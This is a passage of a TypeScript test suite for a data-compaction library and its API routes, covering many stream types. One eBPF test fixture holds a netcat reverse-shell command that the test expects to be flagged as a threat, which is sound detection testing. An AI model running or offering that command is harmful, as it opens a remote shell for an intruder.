import assert from 'node:assert/strict';
import { NextRequest } from 'next/server';
import {
  BroccoliCompactionFacade,
  DomainOptimizationResult,
  HighVelocityBatchResult,
  MegaIncidentCascaderResult,
  MegaDocumentPyramidResult,
  LogStreamCompactionResult,
  MetricStreamCompactionResult,
  TraceStreamCompactionResult,
  StructuredStreamCompactionResult,
  NetworkPacketStreamCompactionResult,
  OrderBookStreamCompactionResult,
  SlidingWindowStreamCompactionResult,
  SensorStreamCompactionResult,
  ClickstreamCompactionResult,
  GenomicStreamCompactionResult,
  StreamEnvelopeCompactionResult,
  EbpfStreamCompactionResult,
  K8sWatchStreamCompactionResult,
  GeospatialStreamCompactionResult,
  ArrowDictionaryStreamCompactionResult,
} from '../src/core/broccolidb/BroccoliCompactionFacade';
import * as BroccoliDbBarrel from '../src/core/broccolidb/index';
import { GET as auditCompactGet, POST as auditCompactPost, OPTIONS as auditCompactOptions } from '../src/app/api/audit/broccolidb/compact/route';
import { GET as broccolidbCompactGet, POST as broccolidbCompactPost } from '../src/app/api/broccolidb/compact/route';

async function testBarrelIsolation(): Promise<void> {
  console.log('  [1/7] Testing barrel isolation and supported public boundaries...');

  assert.ok(BroccoliDbBarrel.BroccoliCompactionFacade, 'BroccoliCompactionFacade must be exported from index.ts');
  assert.ok(BroccoliDbBarrel.BroccoliDomainSpendOptimizer, 'BroccoliDomainSpendOptimizer must be exported from index.ts');
  assert.ok(BroccoliDbBarrel.BroccoliHighVelocityPipeline, 'BroccoliHighVelocityPipeline must be exported from index.ts');
  assert.ok(BroccoliDbBarrel.BroccoliMegaIncidentStreamCascader, 'BroccoliMegaIncidentStreamCascader must be exported from index.ts');
  assert.ok(BroccoliDbBarrel.BroccoliMegaDocumentPyramidCompactor, 'BroccoliMegaDocumentPyramidCompactor must be exported from index.ts');
  assert.ok(BroccoliDbBarrel.BroccoliCompactionSafety, 'BroccoliCompactionSafety must be exported from index.ts');

  // Verify direct generated compactors are NOT leaked through barrel
  const barrelKeys = Object.keys(BroccoliDbBarrel);
  assert.equal((BroccoliDbBarrel as any).BroccoliInterrogatoryCompactor, undefined, 'BroccoliInterrogatoryCompactor must not be barrel-exported');
  assert.equal((BroccoliDbBarrel as any).BroccoliPathologyCompactor, undefined, 'BroccoliPathologyCompactor must not be barrel-exported');
  assert.equal((BroccoliDbBarrel as any).BroccoliFiveGCpCompactor, undefined, 'BroccoliFiveGCpCompactor must not be barrel-exported');
  assert.equal((BroccoliDbBarrel as any).BroccoliSwiftMt103Compactor, undefined, 'BroccoliSwiftMt103Compactor must not be barrel-exported');
  assert.equal((BroccoliDbBarrel as any).BroccoliGdsiiTapeoutCompactor, undefined, 'BroccoliGdsiiTapeoutCompactor must not be barrel-exported');

  console.log(`        - Public exports verified: ${barrelKeys.length} items (no ungrounded generated compactors leaked)`);
}

async function testFacadeUnitWorkflows(): Promise<void> {
  console.log('  [2/7] Testing BroccoliCompactionFacade unit workflows...');
  BroccoliCompactionFacade.clearAll();

  // 1. Domain Compaction (Verified)
  const legalText = `INTERROGATORY NO. 1:\nPlease state the full name, address, and telephone number of each person who witnessed the incident occurring on Jan 15, 2026.\nRESPONSE:\nDefendant objects to this interrogatory on the grounds that it is overly broad. Without waiving said objection, Defendant identifies John Doe, 123 Main St, 555-0199.`;
  const domainRes = BroccoliCompactionFacade.compactDomain(legalText, 'Interrogatory');
  assert.ok(domainRes.originalTokens > 0);
  assert.equal(domainRes.fidelityStatus, 'verified');
  assert.equal(domainRes.domain, 'Interrogatory');

  // 2. Domain Compaction (Adversarial Fallback)
  const ungroundedText = `MT103 message missing fields\n${'random noise buffer '.repeat(50)}`;
  const ungroundedRes = BroccoliCompactionFacade.compactDomain(ungroundedText, 'SWIFT_MT103');
  assert.equal(ungroundedRes.fidelityStatus, 'fallback');
  assert.equal(ungroundedRes.compactedPrompt, ungroundedText);
  assert.equal(ungroundedRes.tokensSaved, 0);

  // 3. Batch Stream Compaction
  const batchRes = BroccoliCompactionFacade.compactBatch([
    { text: legalText, domain: 'Interrogatory' },
    { payload: legalText, domainHint: 'Interrogatory' },
  ]);
  assert.equal(batchRes.totalProcessed, 2);
  assert.ok(batchRes.totalOriginalTokens > 0);
  assert.ok(batchRes.results.length === 2);

  // 4. Incident Cascader
  const repeatedErrors = Array.from({ length: 50 }, (_, i) => `2026-01-01T00:00:0${i % 10}.000Z CRITICAL DB Connection refused`).join('\n');
  const incidentText = `2026-01-01T00:00:00.000Z INFO Start\n2026-01-01T00:00:01.000Z FATAL SEV-0 ROOT_CAUSE primary DB crashed\n${repeatedErrors}\n2026-01-01T00:01:00.000Z INFO Recovered`;
  const incidentRes = BroccoliCompactionFacade.compactIncident({
    rawStreamText: incidentText,
    targetTokenBudget: 1024,
  });
  assert.ok(incidentRes.wasCompacted);
  assert.equal(incidentRes.metTargetTokenBudget, true);
  assert.ok(incidentRes.compactedIncidentPrompt.includes('ROOT_CAUSE'));

  // 5. Document Pyramid
  const docText = [
    'Confidential - Subject to NDA - Draft v1.0',
    'SECTION 1: FINANCIAL COVENANTS',
    'Borrower shall maintain $5,000,000 in liquidity on Jan 10, 2026.',
    'Borrower agrees to deliver quarterly financial statements within 45 days.',
    'Page 1 of 10',
    'Confidential - Subject to NDA - Draft v1.0',
    'SECTION 2: DEFAULT CONDITIONS',
    'Default occurs if payment is late by 30 days.',
    'Notwithstanding anything to the contrary, late fees shall be 5.0%.',
    'Page 2 of 10',
    'Confidential - Subject to NDA - Draft v1.0',
    'SECTION 3: BOILERPLATE PROVISIONS',
    'This agreement is governed by the laws of the State of Delaware.',
    'All notices must be in writing and delivered by certified mail.',
    'Page 3 of 10',
  ].join('\n');
  const docRes = BroccoliCompactionFacade.compactDocument({ rawText: docText });
  assert.ok(docRes.totalSectionsDetected >= 3);
  assert.ok(docRes.compactedPyramidPrompt.includes('$5,000,000'));
  assert.ok(docRes.compactedPyramidPrompt.includes('FINANCIAL COVENANTS'));

  // 5. Drain Log Clustering & TSDB Metric Downsampling
  const logStreamSample = [
    '2026-08-28T09:30:00Z [ERROR] Failed to connect to db at 192.168.1.50:5432: connection timeout after 5000ms',
    '2026-08-28T09:30:01Z [ERROR] Failed to connect to db at 192.168.1.51:5432: connection timeout after 5000ms',
    '2026-08-28T09:30:02Z [ERROR] Failed to connect to db at 192.168.1.52:5432: connection timeout after 5000ms',
  ];
  const logRes = BroccoliCompactionFacade.compactLogStream(logStreamSample);
  assert.equal(logRes.totalLogLines, 3);
  assert.equal(logRes.uniqueTemplatesCount, 1);
  assert.ok(logRes.compactedLogPrompt.includes('<IP>'));

  const metricStreamSample = [
    'http_requests_total{method="GET",handler="/api/v1/users"} 1050',
    'http_requests_total{method="GET",handler="/api/v1/users"} 1080',
    'http_requests_total{method="GET",handler="/api/v1/users"} 1120',
  ];
  const metricRes = BroccoliCompactionFacade.compactMetricStream(metricStreamSample);
  assert.equal(metricRes.totalMetricPoints, 3);
  assert.equal(metricRes.uniqueSeriesCount, 1);
  assert.ok(metricRes.compactedMetricPrompt.includes('Min=1050'));

  // 5.5 Distributed Tracing & Columnar Structured Streams
  const traceStreamSample = [
    '{"traceId":"tr_abc123","spanId":"sp_root","serviceName":"api-gateway","operationName":"POST /checkout","durationMs":450.5,"status":"OK"}',
    '{"traceId":"tr_abc123","spanId":"sp_child1","serviceName":"payment-svc","operationName":"Stripe.Charge","durationMs":412.0,"status":"ERROR","error":"card_declined"}',
  ];
  const traceRes = BroccoliCompactionFacade.compactTraceStream(traceStreamSample);
  assert.equal(traceRes.totalSpans, 2);
  assert.equal(traceRes.errorSpanCount, 1);
  assert.ok(traceRes.compactedTracePrompt.includes('api-gateway'));

  const structuredSample = [
    { id: 1, name: 'Alice', role: 'admin', department: 'Engineering' },
    { id: 2, name: 'Bob', role: 'engineer', department: 'Engineering' },
    { id: 3, name: 'Charlie', role: 'manager', department: 'Product' },
  ];
  const structRes = BroccoliCompactionFacade.compactStructuredStream(structuredSample);
  assert.equal(structRes.totalRecords, 3);
  assert.ok(structRes.columnsDetected.includes('department'));

  // 5.7 Network, Order Book & Sliding Window Streams
  const networkSample = [
    '{"srcIp":"192.168.1.100","dstIp":"10.0.0.1","proto":"TCP","bytes":1500}',
    '{"srcIp":"192.168.1.100","dstIp":"10.0.0.1","proto":"TCP","bytes":1500}',
    '{"srcIp":"192.168.1.200","dstIp":"10.0.0.1","proto":"UDP","bytes":512,"alert":"PORT_SCAN"}',
  ];
  const netRes = BroccoliCompactionFacade.compactNetworkStream(networkSample);
  assert.equal(netRes.totalPackets, 3);
  assert.equal(netRes.securityAlertCount, 1);

  const orderBookSample = [
    '{"symbol":"ETH-USD","side":"BID","price":3200.50,"size":1.5}',
    '{"symbol":"ETH-USD","side":"BID","price":3200.00,"size":5.0}',
    '{"symbol":"ETH-USD","side":"ASK","price":3201.00,"size":2.0}',
  ];
  const obRes = BroccoliCompactionFacade.compactOrderBookStream(orderBookSample);
  assert.equal(obRes.symbol, 'ETH-USD');
  assert.equal(obRes.bids.length, 2);
  assert.equal(obRes.asks.length, 1);

  const windowSample = [
    '{"timestampMs":' + Date.now() + ',"metric":42.5}',
    '{"timestampMs":' + (Date.now() - 1000) + ',"metric":48.0}',
  ];
  const winRes = BroccoliCompactionFacade.compactSlidingWindowStream(windowSample);
  assert.equal(winRes.windowStats.totalFramesIngested, 2);

  // 5.8 Sensor, Clickstream, Genomic & Multi-Stream Envelopes
  const sensorSample = [
    '{"sensorId":"turbine_vib_01","type":"VIBRATION","value":3.2,"unit":"mm/s"}',
    '{"sensorId":"turbine_vib_01","type":"VIBRATION","value":3.8,"unit":"mm/s"}',
  ];
  const sensorRes = BroccoliCompactionFacade.compactSensorStream(sensorSample);
  assert.equal(sensorRes.totalReadings, 2);
  assert.ok(sensorRes.compactedSensorPrompt.includes('turbine_vib_01'));

  const clickstreamSample = [
    '{"sessionId":"sess_101","event":"pageview","page":"/landing"}',
    '{"sessionId":"sess_101","event":"rage_click","page":"/pricing"}',
  ];
  const clickRes = BroccoliCompactionFacade.compactClickstream(clickstreamSample);
  assert.equal(clickRes.totalEvents, 2);
  assert.equal(clickRes.rageClickHotspotsCount, 1);

  const genomicSample = [
    '{"chromosome":"chr17","position":41234456,"ref":"C","alt":"T","depth":100,"alleleFrequency":0.48,"clinicalSignificance":"PATHOGENIC","geneSymbol":"BRCA1"}',
  ];
  const genRes = BroccoliCompactionFacade.compactGenomicStream(genomicSample);
  assert.equal(genRes.totalVariantsProcessed, 1);
  assert.equal(genRes.pathogenicCount, 1);

  const envelopeSample = [
    { type: 'LOG', data: '2026-08-28T09:00:00Z [ERROR] Disk space critical on /dev/sda1' },
    { type: 'METRIC', data: 'http_requests_total 4200' },
  ];
  const envRes = BroccoliCompactionFacade.compactStreamEnvelope(envelopeSample);
  assert.equal(envRes.totalPayloads, 2);
  assert.ok(envRes.detectedStreamTypes.includes('LOG'));

  // 5.9 eBPF, K8s Watch, Geospatial & Arrow Dictionaries
  const ebpfSample = [
    '{"pid":1234,"ppid":1,"comm":"nc","exe":"/bin/nc","args":"-e /bin/sh 10.0.0.5 4444","user":"root"}',
  ];
  const ebpfRes = BroccoliCompactionFacade.compactEbpfStream(ebpfSample);
  assert.equal(ebpfRes.totalSyscalls, 1);
  assert.equal(ebpfRes.securityThreatCount, 1);

  const k8sSample = [
    '{"kind":"Pod","namespace":"prod","name":"payment-service-xyz","action":"MODIFIED","restarts":5,"reason":"CrashLoopBackOff"}',
  ];
  const k8sRes = BroccoliCompactionFacade.compactK8sWatchStream(k8sSample);
  assert.equal(k8sRes.totalWatchEvents, 1);
  assert.equal(k8sRes.unhealthyEventCount, 1);

  const geoSample = [
    '{"icao":"A1234F","callsign":"UAL100","lat":37.7749,"lon":-122.4194,"speed":450.0,"altitude":35000,"squawk":"7700"}',
  ];
  const geoRes = BroccoliCompactionFacade.compactGeospatialStream(geoSample);
  assert.equal(geoRes.totalPoints, 1);
  assert.equal(geoRes.emergencyAlertCount, 1);

  const arrowSample = [
    { country: 'US', tier: 'PRO', score: 98 },
    { country: 'US', tier: 'ENTERPRISE', score: 100 },
  ];
  const arrowRes = BroccoliCompactionFacade.compactArrowDictionaryStream(arrowSample);
  assert.equal(arrowRes.totalRows, 2);
  assert.equal(arrowRes.columnCount, 3);

  // 6. Polymorphic Dispatch
  const polyDomain = BroccoliCompactionFacade.compact({ mode: 'domain', text: legalText, domainHint: 'Interrogatory' });
  assert.equal(polyDomain.mode, 'domain');
  assert.equal(polyDomain.result.fidelityStatus, 'verified');

  const polyLog = BroccoliCompactionFacade.compact({ mode: 'log_stream', logs: logStreamSample });
  assert.equal(polyLog.mode, 'log_stream');
  assert.equal(polyLog.result.totalLogLines, 3);

  const polyMetric = BroccoliCompactionFacade.compact({ mode: 'metric_stream', metrics: metricStreamSample });
  assert.equal(polyMetric.mode, 'metric_stream');

  const polyTrace = BroccoliCompactionFacade.compact({ mode: 'trace_stream', traces: traceStreamSample });
  assert.equal(polyTrace.mode, 'trace_stream');

  const polyStruct = BroccoliCompactionFacade.compact({ mode: 'structured_stream', records: structuredSample });
  assert.equal(polyStruct.mode, 'structured_stream');

  const polyNet = BroccoliCompactionFacade.compact({ mode: 'network_stream', packets: networkSample });
  assert.equal(polyNet.mode, 'network_stream');

  const polyOb = BroccoliCompactionFacade.compact({ mode: 'orderbook_stream', ticks: orderBookSample });
  assert.equal(polyOb.mode, 'orderbook_stream');

  const polyWin = BroccoliCompactionFacade.compact({ mode: 'window_stream', frames: windowSample });
  assert.equal(polyWin.mode, 'window_stream');

  const polySens = BroccoliCompactionFacade.compact({ mode: 'sensor_stream', readings: sensorSample });
  assert.equal(polySens.mode, 'sensor_stream');

  const polyClick = BroccoliCompactionFacade.compact({ mode: 'clickstream', events: clickstreamSample });
  assert.equal(polyClick.mode, 'clickstream');

  const polyGen = BroccoliCompactionFacade.compact({ mode: 'genomic_stream', variants: genomicSample });
  assert.equal(polyGen.mode, 'genomic_stream');

  const polyEnv = BroccoliCompactionFacade.compact({ mode: 'stream_envelope', payloads: envelopeSample });
  assert.equal(polyEnv.mode, 'stream_envelope');

  const polyEbpf = BroccoliCompactionFacade.compact({ mode: 'ebpf_stream', events: ebpfSample });
  assert.equal(polyEbpf.mode, 'ebpf_stream');

  const polyK8s = BroccoliCompactionFacade.compact({ mode: 'k8s_watch_stream', events: k8sSample });
  assert.equal(polyK8s.mode, 'k8s_watch_stream');

  const polyGeo = BroccoliCompactionFacade.compact({ mode: 'geospatial_stream', points: geoSample });
  assert.equal(polyGeo.mode, 'geospatial_stream');

  const polyArrow = BroccoliCompactionFacade.compact({ mode: 'arrow_dict_stream', rows: arrowSample });
  assert.equal(polyArrow.mode, 'arrow_dict_stream');

  const polyIncident = BroccoliCompactionFacade.compact({ mode: 'incident', rawStreamText: incidentText, targetTokenBudget: 1024 });
  assert.equal(polyIncident.mode, 'incident');

  // 7. Input bounds rejection
  assert.throws(() => BroccoliCompactionFacade.compactDomain('a'.repeat(2_000_001)), RangeError);
  assert.throws(() => BroccoliCompactionFacade.compactIncident({ rawStreamText: incidentText, targetTokenBudget: 10 }), RangeError);

  console.log('        - Facade unit workflows (19 modes: domain, batch, incident, doc, log, metric, trace, structured, network, orderbook, window, sensor, click, genomic, envelope, ebpf, k8s, geo, arrow) passed with strict fail-closed safety.');
}

async function testApiRouteGetAndOptions(): Promise<void> {
  console.log('  [3/7] Testing GET and OPTIONS route endpoints...');

  // GET /api/audit/broccolidb/compact
  const getRes = await auditCompactGet();
  assert.equal(getRes.status, 200);
  const getJson = await getRes.json();
  assert.equal(getJson.status, 'operational');
  assert.equal(getJson.service, 'broccolidb-compaction-gateway');
  assert.ok(Array.isArray(getJson.supportedModes));
  assert.ok(getJson.limits.maxPayloadBytes > 0);

  // GET /api/broccolidb/compact (alias)
  const aliasGetRes = await broccolidbCompactGet();
  assert.equal(aliasGetRes.status, 200);

  // OPTIONS
  const optRes = await auditCompactOptions();
  assert.equal(optRes.status, 204);
  assert.ok(optRes.headers.get('Access-Control-Allow-Origin'));

  console.log('        - GET and OPTIONS handlers returned operational status and CORS headers.');
}

async function testApiRouteDomainCompaction(): Promise<void> {
  console.log('  [4/7] Testing POST /api/audit/broccolidb/compact with domain payload...');

  const legalText = `PROPOUNDING PARTY: Plaintiff Acme Corp
RESPONDING PARTY: Defendant Zenith LLC
SET NUMBER: One (1)
SPECIAL INTERROGATORY NO. 14: Please identify every person who participated in the trade secret misappropriation meeting on June 14, 2026.
RESPONSE TO SPECIAL INTERROGATORY NO. 14: Responding party objects on grounds of attorney-client privilege, work product doctrine, and undue burden. Subject to said objections: Dr. Alexander Chen and Marcus Thorne were present.
` + 'STANDARD BOILERPLATE OBJECTION WORDS '.repeat(60);

  const req = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      'authorization': 'Bearer test_token',
    },
    body: JSON.stringify({
      mode: 'domain',
      text: legalText,
      domainHint: 'Interrogatory',
    }),
  });

  const res = await auditCompactPost(req);
  assert.equal(res.status, 200);
  const json = await res.json();
  assert.equal(json.status, 'success');
  assert.equal(json.mode, 'domain');
  assert.equal((json.data as DomainOptimizationResult).fidelityStatus, 'verified');
  assert.ok((json.data as DomainOptimizationResult).tokensSaved > 0);

  console.log(`        - Domain response: saved ${json.data.tokensSaved} tokens (${json.data.savingsPercentage}%) with verified fidelity.`);
}

async function testApiRouteBatchAndIncidentAndDocument(): Promise<void> {
  console.log('  [5/7] Testing POST /api/audit/broccolidb/compact across batch, incident, and document modes...');

  // 1. Batch mode
  const batchReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'batch',
      items: [
        { text: 'Sample text 1', domain: 'Generic' },
        { text: 'Sample text 2', domain: 'Generic' },
      ],
    }),
  });
  const batchRes = await auditCompactPost(batchReq);
  assert.equal(batchRes.status, 200);
  const batchJson = await batchRes.json();
  assert.equal(batchJson.mode, 'batch');
  assert.equal((batchJson.data as HighVelocityBatchResult).totalProcessed, 2);

  // 2. Incident mode via alias route (/api/broccolidb/compact)
  const incidentReq = new NextRequest('http://localhost:3000/api/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'incident',
      rawStreamText: '2026-01-01T00:00:00.000Z FATAL SEV-0 ROOT_CAUSE memory pressure failure\n2026-01-01T00:01:00.000Z INFO recovered',
      targetTokenBudget: 1024,
    }),
  });
  const incidentRes = await broccolidbCompactPost(incidentReq);
  assert.equal(incidentRes.status, 200);
  const incidentJson = await incidentRes.json();
  assert.equal(incidentJson.mode, 'incident');
  assert.ok((incidentJson.data as MegaIncidentCascaderResult).compactedIncidentPrompt.includes('ROOT_CAUSE'));

  // 3. Document mode
  const docReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'document',
      rawText: 'SECTION 1: TITLE\nAmount owed is $1,250.00 due on Feb 1, 2026.',
    }),
  });
  const docRes = await auditCompactPost(docReq);
  assert.equal(docRes.status, 200);
  const docJson = await docRes.json();
  assert.equal(docJson.mode, 'document');
  assert.ok((docJson.data as MegaDocumentPyramidResult).compactedPyramidPrompt.includes('$1,250.00'));

  // 4. Log Stream mode
  const logReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'log_stream',
      logs: [
        '2026-08-28T09:40:01Z [ERROR] Failed to connect to db at 192.168.1.50:5432: connection timeout after 5000ms',
        '2026-08-28T09:40:02Z [ERROR] Failed to connect to db at 192.168.1.51:5432: connection timeout after 5000ms',
      ],
    }),
  });
  const logRes = await auditCompactPost(logReq);
  assert.equal(logRes.status, 200);
  const logJson = await logRes.json();
  assert.equal(logJson.mode, 'log_stream');
  assert.equal((logJson.data as LogStreamCompactionResult).totalLogLines, 2);

  // 5. Metric Stream mode
  const metricReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'metric_stream',
      metrics: [
        'http_requests_total{method="GET"} 100',
        'http_requests_total{method="GET"} 150',
      ],
    }),
  });
  const metricRes = await auditCompactPost(metricReq);
  assert.equal(metricRes.status, 200);
  const metricJson = await metricRes.json();
  assert.equal(metricJson.mode, 'metric_stream');
  assert.equal((metricJson.data as MetricStreamCompactionResult).totalMetricPoints, 2);

  // 6. Trace Stream mode
  const traceReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'trace_stream',
      traces: [
        '{"traceId":"tr_01","spanId":"sp_01","serviceName":"auth","operationName":"login","durationMs":15.2,"status":"OK"}',
      ],
    }),
  });
  const traceRes = await auditCompactPost(traceReq);
  assert.equal(traceRes.status, 200);
  const traceJson = await traceRes.json();
  assert.equal(traceJson.mode, 'trace_stream');
  assert.equal((traceJson.data as TraceStreamCompactionResult).totalSpans, 1);

  // 7. Structured Stream mode
  const structReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'structured_stream',
      records: [
        { id: 101, status: 'active', metric: 'cpu' },
        { id: 102, status: 'pending', metric: 'ram' },
      ],
    }),
  });
  const structRes = await auditCompactPost(structReq);
  assert.equal(structRes.status, 200);
  const structJson = await structRes.json();
  assert.equal(structJson.mode, 'structured_stream');
  assert.equal((structJson.data as StructuredStreamCompactionResult).totalRecords, 2);

  // 8. Network Stream mode
  const netReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'network_stream',
      packets: [
        '{"srcIp":"10.0.0.1","dstIp":"10.0.0.2","proto":"TCP","bytes":128}',
      ],
    }),
  });
  const netRes = await auditCompactPost(netReq);
  assert.equal(netRes.status, 200);
  const netJson = await netRes.json();
  assert.equal(netJson.mode, 'network_stream');
  assert.equal((netJson.data as NetworkPacketStreamCompactionResult).totalPackets, 1);

  // 9. Order Book Stream mode
  const obReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'orderbook_stream',
      ticks: [
        '{"symbol":"BTC-USD","side":"BID","price":65000.0,"size":0.5}',
      ],
    }),
  });
  const obRes = await auditCompactPost(obReq);
  assert.equal(obRes.status, 200);
  const obJson = await obRes.json();
  assert.equal(obJson.mode, 'orderbook_stream');
  assert.equal((obJson.data as OrderBookStreamCompactionResult).symbol, 'BTC-USD');

  // 10. Window Stream mode
  const winReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'window_stream',
      frames: [
        '{"timestampMs":' + Date.now() + ',"value":99.0}',
      ],
    }),
  });
  const winRes = await auditCompactPost(winReq);
  assert.equal(winRes.status, 200);
  const winJson = await winRes.json();
  assert.equal(winJson.mode, 'window_stream');
  assert.equal((winJson.data as SlidingWindowStreamCompactionResult).windowStats.totalFramesIngested, 1);

  // 11. Sensor Stream mode
  const sensorReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'sensor_stream',
      readings: [
        '{"sensorId":"temp_sensor_1","type":"THERMAL","value":45.2}',
      ],
    }),
  });
  const sensorRes = await auditCompactPost(sensorReq);
  assert.equal(sensorRes.status, 200);
  const sensorJson = await sensorRes.json();
  assert.equal(sensorJson.mode, 'sensor_stream');
  assert.equal((sensorJson.data as SensorStreamCompactionResult).totalReadings, 1);

  // 12. Clickstream mode
  const clickReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'clickstream',
      events: [
        '{"sessionId":"sess_test","event":"click","page":"/app"}',
      ],
    }),
  });
  const clickRes = await auditCompactPost(clickReq);
  assert.equal(clickRes.status, 200);
  const clickJson = await clickRes.json();
  assert.equal(clickJson.mode, 'clickstream');
  assert.equal((clickJson.data as ClickstreamCompactionResult).totalEvents, 1);

  // 13. Genomic Stream mode
  const genReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'genomic_stream',
      variants: [
        '{"chromosome":"chr1","position":12345,"ref":"A","alt":"G","depth":30,"alleleFrequency":0.5}',
      ],
    }),
  });
  const genRes = await auditCompactPost(genReq);
  assert.equal(genRes.status, 200);
  const genJson = await genRes.json();
  assert.equal(genJson.mode, 'genomic_stream');
  assert.equal((genJson.data as GenomicStreamCompactionResult).totalVariantsProcessed, 1);

  // 14. Stream Envelope mode
  const envReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'stream_envelope',
      payloads: [
        { type: 'LOG', data: '2026-08-28T09:00:00Z [INFO] Service started' },
      ],
    }),
  });
  const envRes = await auditCompactPost(envReq);
  assert.equal(envRes.status, 200);
  const envJson = await envRes.json();
  assert.equal(envJson.mode, 'stream_envelope');
  assert.equal((envJson.data as StreamEnvelopeCompactionResult).totalPayloads, 1);

  // 15. eBPF Stream mode
  const ebpfReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'ebpf_stream',
      events: [
        '{"pid":5001,"ppid":1,"comm":"falco","exe":"/usr/bin/falco","user":"root"}',
      ],
    }),
  });
  const ebpfRes = await auditCompactPost(ebpfReq);
  assert.equal(ebpfRes.status, 200);
  const ebpfJson = await ebpfRes.json();
  assert.equal(ebpfJson.mode, 'ebpf_stream');
  assert.equal((ebpfJson.data as EbpfStreamCompactionResult).totalSyscalls, 1);

  // 16. K8s Watch Stream mode
  const k8sReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'k8s_watch_stream',
      events: [
        '{"kind":"Deployment","namespace":"default","name":"web-app","action":"MODIFIED"}',
      ],
    }),
  });
  const k8sRes = await auditCompactPost(k8sReq);
  assert.equal(k8sRes.status, 200);
  const k8sJson = await k8sRes.json();
  assert.equal(k8sJson.mode, 'k8s_watch_stream');
  assert.equal((k8sJson.data as K8sWatchStreamCompactionResult).totalWatchEvents, 1);

  // 17. Geospatial Stream mode
  const geoReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'geospatial_stream',
      points: [
        '{"icao":"C00123","callsign":"DAL456","lat":40.7128,"lon":-74.0060,"speed":510.0}',
      ],
    }),
  });
  const geoRes = await auditCompactPost(geoReq);
  assert.equal(geoRes.status, 200);
  const geoJson = await geoRes.json();
  assert.equal(geoJson.mode, 'geospatial_stream');
  assert.equal((geoJson.data as GeospatialStreamCompactionResult).totalPoints, 1);

  // 18. Arrow Dictionary Stream mode
  const arrowReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({
      mode: 'arrow_dict_stream',
      rows: [
        { os: 'mac', browser: 'chrome', active: true },
      ],
    }),
  });
  const arrowRes = await auditCompactPost(arrowReq);
  assert.equal(arrowRes.status, 200);
  const arrowJson = await arrowRes.json();
  assert.equal(arrowJson.mode, 'arrow_dict_stream');
  assert.equal((arrowJson.data as ArrowDictionaryStreamCompactionResult).totalRows, 1);

  console.log('        - All 19 compaction endpoints (domain, batch, incident, doc, log, metric, trace, structured, network, orderbook, window, sensor, click, genomic, envelope, ebpf, k8s, geo, arrow) executed successfully.');
}

async function testApiValidationAndErrorHandling(): Promise<void> {
  console.log('  [6/7] Testing API route validation, bounds, and error handling...');

  // 1. Empty body
  const emptyReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '',
  });
  const emptyRes = await auditCompactPost(emptyReq);
  assert.equal(emptyRes.status, 400);

  // 2. Malformed JSON
  const malformedReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '{not valid json',
  });
  const malformedRes = await auditCompactPost(malformedReq);
  assert.equal(malformedRes.status, 400);

  // 3. Invalid mode
  const badModeReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ mode: 'invalid_mode_name' }),
  });
  const badModeRes = await auditCompactPost(badModeReq);
  assert.equal(badModeRes.status, 400);

  // 4. Missing required field in mode
  const missingFieldReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ mode: 'incident' }), // missing rawStreamText
  });
  const missingFieldRes = await auditCompactPost(missingFieldReq);
  assert.equal(missingFieldRes.status, 400);

  // 5. Oversized payload header (413)
  const oversizedHeaderReq = new NextRequest('http://localhost:3000/api/audit/broccolidb/compact', {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      'content-length': String(15 * 1024 * 1024), // 15MB
    },
